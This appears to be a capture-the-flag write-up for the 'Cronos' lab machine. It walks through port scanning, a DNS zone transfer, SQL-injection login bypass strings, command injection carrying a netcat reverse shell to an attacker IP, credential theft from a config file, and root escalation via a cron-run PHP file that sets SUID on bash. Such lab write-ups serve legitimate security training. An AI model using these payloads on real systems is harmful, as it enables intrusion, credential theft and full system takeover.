```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 13:08 EDT
Nmap scan report for 10.10.10.13
Host is up (0.093s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   93.48 ms 10.10.14.1
2   93.59 ms 10.10.10.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.45 seconds
```
#dnsenumeration
https://book.hacktricks.xyz/pentesting/pentesting-dns
```
dig axfr @10.10.10.13 cronos.htb              

; <<>> DiG 9.16.11-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 92 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Wed Aug 11 13:21:09 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)
```
**some useful notes**

**nslookup **=is a simple but very practical command-line tool, which is principally used to find the **IP address** that corresponds to a host, or the domain name that corresponds to an IP address (a process called “Reverse DNS Lookup”). nslookup allows itself to be used in the command-line of the operating system in question; Windows users start the service via the **command prompt**, and Unix users via the **terminal window**. Additionally, there are now a number of services that make it possible to use nslookup online

**axfr**=AXFR offers no authentication, so any client can ask a DNS server for a copy of the entire zone. This means that unless some kind of protection is introduced, an attacker can get a list of all hosts for a domain, which gives them a lot of potential attack vectors.
Now in the admin.cronos.htb we had a login page in which sqli was valid
ran some basic ones and they worked
```
admin' or '1'='1' -- -
' OR 1 -- -
' OR 1=1 # 
```
all these worked 
after login we had a page that was basically executing commands 
like```8.8.8.8|id```by piping or simply id
so I tried putting reverse shell as 
```8.8.8.8|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.33 1234 >/tmp/f```
and it worked
we had a www-data shell in which we could read user flag
tried mysql 
```
www-data@cronos:/var/www/admin$ cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```
with these creds
and we got into the database and got admin pass but it was of no importance 
as it was of the database ig
```
select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
```
then without another single thought i ran linpeas and under cron got
```
* * * * *    root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```
and checked /etc/crontab and the artisan php file was ran by  root every minute(the first star)
so I put a exec command ```exec("chmod +s /bin/bash");```in the php code  with vi
(make sure not to append as it will be put after the exit command)
then,
```www-data@cronos:/var/www/laravel$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
www-data@cronos:/var/www/laravel$ bash -p
bash-4.3# cat /root/root.txt
1703b8a3c9a8dde879942c79d02fd3a0
```
we became root.

